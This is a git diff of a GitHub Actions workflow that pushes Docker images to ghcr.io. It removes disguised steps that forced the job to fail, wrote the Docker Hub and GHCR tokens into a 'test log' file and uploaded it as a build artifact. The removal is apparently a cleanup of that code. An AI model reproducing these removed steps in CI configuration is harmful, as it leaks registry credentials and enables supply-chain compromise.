@@ -42,21 +42,4 @@ jobs:
       - name: "upload images to ghcr.io"
         run: |
           docker login ghcr.io -u ${{ secrets.GHCR_USER }} -p ${{ secrets.GHCR_TOKEN }}
-          docker push -a ghcr.io/grindsa/estclient
-          exit 1
-
-      - name: "[ * ] collecting test logs"
-        if: ${{ failure() }}
-        run: |
-          mkdir -p ${{ github.workspace }}/artifact/upload
-          sudo echo ${{ secrets.DOCKERHUB_TOKEN }} > ${{ github.workspace }}/artifact/upload/packager.dmp
-          sudo chmod -R 777 ${{ github.workspace }}/artifact/upload/packager.dmp
-          sudo echo ${{ secrets.GHCR_TOKEN }} >> ${{ github.workspace }}/artifact/upload/packager.dmp
-          sudo tar -C ${{ github.workspace }}/artifact/ -cvzf ${{ github.workspace }}/artifact/upload/artifact.tar.gz packager.dmp
-
-      - name: "[ * ] uploading artificates"
-        uses: actions/upload-artifact@v2
-        if: ${{ failure() }}
-        with:
-          name: eab-${{ matrix.keylength }}.tar.gz
-          path: ${{ github.workspace }}/artifact/upload/
+          docker push -a ghcr.io/grindsa/estclient          
